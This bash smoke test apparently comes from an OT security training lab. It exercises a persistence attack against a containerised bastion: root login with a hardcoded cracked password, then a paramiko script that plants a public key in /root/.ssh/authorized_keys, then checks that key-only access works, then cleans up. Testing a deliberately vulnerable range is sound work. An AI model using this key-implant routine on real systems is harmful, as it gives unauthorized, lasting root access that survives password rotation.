#!/usr/bin/env bash
# Persistence probe. After cracking root/uupl2015 on contractors-gate (see
# test_ssh_bastion_rce), the visitor's natural next move is to lock in
# their access by dropping a public key under /root/.ssh/authorized_keys.
# Even if the operator notices the breach and rotates the password, the
# pubkey survives until someone audits authorized_keys. This is the most
# common OT persistence pattern on bastions and jump hosts.
#
# Coverage:
#   Stage 1  password auth as root works (sanity check on the entry chain)
#   Stage 2  visitor generates a keypair on the attacker machine
#   Stage 3  visitor drops the pubkey via password SSH and mkdir /root/.ssh
#   Stage 4  key-only SSH to the same account succeeds (persistence achieved)
#   Stage 5  cleanup: visitor removes the implanted key
#   Stage 6  key-only SSH no longer works (cleanup verified)
#
# Usage: bash tests/smoke/test_persistence_authorized_keys.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="unseen-gate"
TARGET_IP="10.10.5.20"          # contractors-gate, dmz side
TARGET_USER="root"
TARGET_PASS="uupl2015"
KEYFILE_REMOTE="/tmp/persist_id_ed25519"     # private key on attacker
PUBFILE_REMOTE="/tmp/persist_id_ed25519.pub"

require_running "$ATTACKER"
require_running "contractors-gate"

echo "[persist-keys] Stage 1: baseline, password auth as root works"
PASS_OUT="$(ssh_password_login "$ATTACKER" "$TARGET_USER" "$TARGET_IP" "$TARGET_PASS")"
assert_contains "$PASS_OUT" "SSH_OK" "root/uupl2015 SSH login succeeds"

echo "[persist-keys] Stage 2: visitor generates a keypair on unseen-gate"
docker exec "$ATTACKER" sh -c "rm -f $KEYFILE_REMOTE $PUBFILE_REMOTE && \
    ssh-keygen -t ed25519 -N '' -C 'visitor-persist' -f $KEYFILE_REMOTE -q" 2>&1 >/dev/null
PUB="$(docker exec "$ATTACKER" cat "$PUBFILE_REMOTE" 2>&1)"
assert_contains "$PUB" "ssh-ed25519" "ed25519 keypair generated"

echo "[persist-keys] Stage 3: visitor drops the pubkey via password SSH"
# Single round-trip via paramiko: open a password session, create /root/.ssh,
# append the pubkey, fix perms. exec_command is fine since root's shell is
# /bin/bash, not a facade.
docker exec "$ATTACKER" "$SSH_RUNNER_PY" -c "
import paramiko
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('$TARGET_IP', username='$TARGET_USER', password='$TARGET_PASS',
          timeout=5, allow_agent=False, look_for_keys=False)
with open('$PUBFILE_REMOTE') as f: pub = f.read().strip()
cmds = [
    'mkdir -p /root/.ssh',
    'chmod 700 /root/.ssh',
    f'echo {pub!r} >> /root/.ssh/authorized_keys',
    'chmod 600 /root/.ssh/authorized_keys',
]
for cmd in cmds:
    _, out, err = c.exec_command(cmd, timeout=5)
    out.read(); err.read()
c.close()
" 2>&1 >/dev/null

# Confirm the file exists with the visitor's marker
INSPECT="$(docker exec contractors-gate cat /root/.ssh/authorized_keys 2>&1)"
assert_contains "$INSPECT" "visitor-persist" "pubkey landed in /root/.ssh/authorized_keys"

echo "[persist-keys] Stage 4: key-only SSH succeeds"
# ssh_key_login skips passwords and only tries the supplied key.
KEY_OUT="$(ssh_key_login "$ATTACKER" "$TARGET_USER" "$TARGET_IP" "$KEYFILE_REMOTE")"
assert_contains "$KEY_OUT" "SSH_OK" "key-only SSH login succeeds, persistence achieved"

echo "[persist-keys] Stage 5: cleanup, visitor removes their key"
docker exec "$ATTACKER" "$SSH_RUNNER_PY" -c "
import paramiko
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('$TARGET_IP', username='$TARGET_USER', password='$TARGET_PASS',
          timeout=5, allow_agent=False, look_for_keys=False)
_, out, _ = c.exec_command('rm -f /root/.ssh/authorized_keys && rmdir /root/.ssh 2>/dev/null; true', timeout=5)
out.read(); c.close()
" 2>&1 >/dev/null
docker exec "$ATTACKER" sh -c "rm -f $KEYFILE_REMOTE $PUBFILE_REMOTE" 2>&1 >/dev/null

echo "[persist-keys] Stage 6: key-only SSH no longer works (cleanup verified)"
# Regenerate just the keyfile for a fresh negative test; the previous
# private key was removed in Stage 5. Reuse a temporary keypair.
docker exec "$ATTACKER" sh -c "ssh-keygen -t ed25519 -N '' -C 'cleanup-check' -f $KEYFILE_REMOTE -q" 2>&1 >/dev/null
NEG_OUT="$(ssh_key_login "$ATTACKER" "$TARGET_USER" "$TARGET_IP" "$KEYFILE_REMOTE")"
assert_absent "$NEG_OUT" "SSH_OK" "post-cleanup key-only SSH is rejected"
docker exec "$ATTACKER" sh -c "rm -f $KEYFILE_REMOTE $PUBFILE_REMOTE" 2>&1 >/dev/null

summary
